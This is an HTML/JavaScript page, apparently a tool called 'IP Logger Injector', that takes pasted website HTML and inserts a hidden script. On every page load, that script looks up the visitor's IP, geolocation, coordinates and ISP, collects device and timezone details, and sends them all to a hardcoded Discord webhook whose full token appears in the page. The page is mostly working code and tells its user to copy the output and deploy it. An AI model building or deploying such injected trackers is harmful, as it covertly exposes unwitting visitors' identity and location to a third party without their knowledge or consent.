<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger Injector - Mall Security</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0a0e27;
            font-family: 'Consolas', 'Monaco', monospace;
            padding: 20px;
        }
        .container {
            max-width: 1600px;
            margin: 0 auto;
        }
        .toolbar {
            background: #1a1f3a;
            padding: 15px 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            display: flex;
            gap: 15px;
            align-items: center;
            flex-wrap: wrap;
        }
        .toolbar label {
            color: #8b9dff;
            font-weight: bold;
        }
        .toolbar input {
            background: #0d0f23;
            border: 1px solid #2a2f4f;
            color: white;
            padding: 8px 15px;
            border-radius: 6px;
            width: 300px;
            font-family: monospace;
        }
        button {
            background: linear-gradient(135deg, #4a3ab5, #2a1a8a);
            color: white;
            border: none;
            padding: 8px 20px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
        }
        button:hover {
            background: linear-gradient(135deg, #5a4ac5, #3a2a9a);
        }
        .copy-btn {
            background: #2a5f3a;
        }
        .copy-btn:hover {
            background: #3a7f4a;
        }
        .editor-area {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
        .panel {
            background: #11152f;
            border-radius: 8px;
            overflow: hidden;
            border: 1px solid #2a2f4f;
        }
        .panel-header {
            background: #1a1f3a;
            padding: 12px 15px;
            color: #8b9dff;
            font-weight: bold;
            border-bottom: 1px solid #2a2f4f;
        }
        textarea {
            width: 100%;
            height: 550px;
            background: #0d0f23;
            border: none;
            color: #b8c7ff;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 12px;
            padding: 15px;
            resize: vertical;
            outline: none;
        }
        #outputHtml {
            background: #0a0c1f;
        }
        .status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 6px;
            display: none;
        }
        .status.success {
            background: #1a3a2a;
            color: #6fcf97;
            display: block;
            border-left: 4px solid #2ecc71;
        }
        .status.error {
            background: #3a1a1a;
            color: #e74c3c;
            display: block;
            border-left: 4px solid #e74c3c;
        }
        .webhook-info {
            background: #1a1f3a;
            padding: 10px 15px;
            border-radius: 6px;
            margin-top: 20px;
            font-size: 12px;
            color: #6b7bb5;
        }
        .webhook-info code {
            color: #ffb86c;
            word-break: break-all;
        }
        @media (max-width: 900px) {
            .editor-area {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="toolbar">
        <label>🏷️ LABEL / KIOSK ID:</label>
        <input type="text" id="labelInput" placeholder="ex: Entrance_A_Kiosk_3" value="Mall_Kiosk_Main">
        <button id="injectBtn">🔧 INJECT TRACKER</button>
        <button id="copyBtn" class="copy-btn">📋 COPY OUTPUT</button>
    </div>

    <div class="editor-area">
        <div class="panel">
            <div class="panel-header">📥 INPUT: YOUR WEBSITE HTML SOURCE</div>
            <textarea id="inputHtml" placeholder='Paste your full HTML code here...'></textarea>
        </div>
        <div class="panel">
            <div class="panel-header">📤 OUTPUT: TRACKED VERSION (COPY THIS)</div>
            <textarea id="outputHtml" placeholder="Click INJECT to generate tracked HTML..." readonly style="background:#0a0c1f;"></textarea>
        </div>
    </div>

    <div id="statusMsg" class="status"></div>

    <div class="webhook-info">
        🔗 <strong>Discord Webhook Active:</strong> <code>https://discord.com/api/webhooks/1499088458407219200/2K55GD94Hb9UDxfsBk-ZVF__9z-Bc2Qv1dg-H94f89pRoU5jq4jNpyyPQ5s7D1z5vyds</code><br>
        📊 Tracks: IP • Geolocation • ISP • Device • Timestamp • Referrer • Custom Label
    </div>
</div>

<script>
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1499088458407219200/2K55GD94Hb9UDxfsBk-ZVF__9z-Bc2Qv1dg-H94f89pRoU5jq4jNpyyPQ5s7D1z5vyds';

    function getTrackerScript(label) {
        const cleanLabel = label.replace(/\\/g, '\\\\').replace(/`/g, '\\`').replace(/\$/g, '\\$').replace(/"/g, '\\"');
        
        return '\n<!-- IP LOGGER INJECTED BY EVIDENCE WATCHER -->\n<script>\n(function(){\n    const KIOSK_LABEL = "' + cleanLabel + '";\n    const WEBHOOK = "' + WEBHOOK_URL + '";\n    const TS = new Date().toISOString();\n    const URL = window.location.href;\n    const TITLE = document.title;\n    const REF = document.referrer || "Direct";\n    \n    async function getData() {\n        try {\n            const geo = await fetch("https://ipapi.co/json/").then(r => r.json());\n            const payload = {\n                label: KIOSK_LABEL,\n                timestamp: TS,\n                url: URL,\n                title: TITLE,\n                referrer: REF,\n                ip: geo.ip || "unknown",\n                city: geo.city || "unknown",\n                region: geo.region || "unknown",\n                country: geo.country_name || "unknown",\n                lat: geo.latitude || "unknown",\n                lon: geo.longitude || "unknown",\n                isp: geo.org || "unknown",\n                ua: navigator.userAgent,\n                screen: screen.width + "x" + screen.height,\n                tz: Intl.DateTimeFormat().resolvedOptions().timeZone\n            };\n            \n            const embed = {\n                title: "📍 VISITOR DETECTED - " + payload.label,\n                color: 0xff4444,\n                fields: [\n                    {name: "🌐 IP", value: payload.ip, inline: true},\n                    {name: "📍 Location", value: payload.city + ", " + payload.region + "\\n" + payload.country, inline: true},\n                    {name: "🗺️ Coords", value: payload.lat + ", " + payload.lon, inline: true},\n                    {name: "🏢 ISP", value: payload.isp, inline: true},\n                    {name: "📱 Device", value: payload.ua.substring(0, 80), inline: false},\n                    {name: "🔗 Page", value: payload.url.substring(0, 100), inline: false},\n                    {name: "🏷️ Kiosk", value: payload.label, inline: true},\n                    {name: "⏱️ Time", value: payload.timestamp, inline: true}\n                ]\n            };\n            await fetch(WEBHOOK, {\n                method: "POST",\n                headers: {"Content-Type": "application/json"},\n                body: JSON.stringify({embeds: [embed], username: "EvidenceWatcher"})\n            });\n        } catch(e) { console.error("EvidenceWatcher error:", e); }\n    }\n    getData();\n})();\n<\/script>\n<!-- END INJECTED TRACKER -->\n';
    }

    function injectScript(html, label) {
        if (!html || html.trim() === "") {
            throw new Error("Paste some HTML first.");
        }
        if (!label || label.trim() === "") {
            throw new Error("Enter a label.");
        }
        
        const scriptBlock = getTrackerScript(label.trim());
        
        // Look for </body>
        if (html.indexOf('</body>') > -1) {
            return html.replace('</body>', scriptBlock + '\n</body>');
        }
        // Look for </html>
        if (html.indexOf('</html>') > -1) {
            return html.replace('</html>', scriptBlock + '\n</html>');
        }
        // Just append
        return html + '\n' + scriptBlock;
    }

    const inputArea = document.getElementById('inputHtml');
    const outputArea = document.getElementById('outputHtml');
    const labelInput = document.getElementById('labelInput');
    const injectBtn = document.getElementById('injectBtn');
    const copyBtn = document.getElementById('copyBtn');
    const statusDiv = document.getElementById('statusMsg');

    // Clean example - NO TOOL CODE LEAKAGE
    inputArea.value = '<!DOCTYPE html>\n<html>\n<head>\n    <title>Mall Directory Kiosk</title>\n</head>\n<body>\n    <h1>Welcome to Grand Mall</h1>\n    <p>Find your way around</p>\n</body>\n</html>';

    injectBtn.addEventListener('click', () => {
        const source = inputArea.value;
        const label = labelInput.value;
        
        try {
            const result = injectScript(source, label);
            outputArea.value = result;
            statusDiv.className = 'status success';
            statusDiv.textContent = '✅ INJECTED! Copy the output HTML and deploy.';
            statusDiv.style.display = 'block';
            setTimeout(() => {
                statusDiv.style.display = 'none';
            }, 3000);
        } catch (err) {
            statusDiv.className = 'status error';
            statusDiv.textContent = '❌ ' + err.message;
            statusDiv.style.display = 'block';
            setTimeout(() => {
                statusDiv.style.display = 'none';
            }, 3000);
        }
    });

    copyBtn.addEventListener('click', async () => {
        const code = outputArea.value;
        if (!code || code.trim() === "" || code === "Click INJECT to generate tracked HTML...") {
            statusDiv.className = 'status error';
            statusDiv.textContent = '❌ Nothing to copy. Inject something first.';
            statusDiv.style.display = 'block';
            setTimeout(() => statusDiv.style.display = 'none', 2000);
            return;
        }
        try {
            await navigator.clipboard.writeText(code);
            statusDiv.className = 'status success';
            statusDiv.textContent = '📋 COPIED!';
            statusDiv.style.display = 'block';
            setTimeout(() => statusDiv.style.display = 'none', 2000);
        } catch (err) {
            outputArea.select();
            document.execCommand('copy');
            statusDiv.className = 'status success';
            statusDiv.textContent = '📋 COPIED!';
            statusDiv.style.display = 'block';
            setTimeout(() => statusDiv.style.display = 'none', 2000);
        }
    });
</script>
</body>
</html>
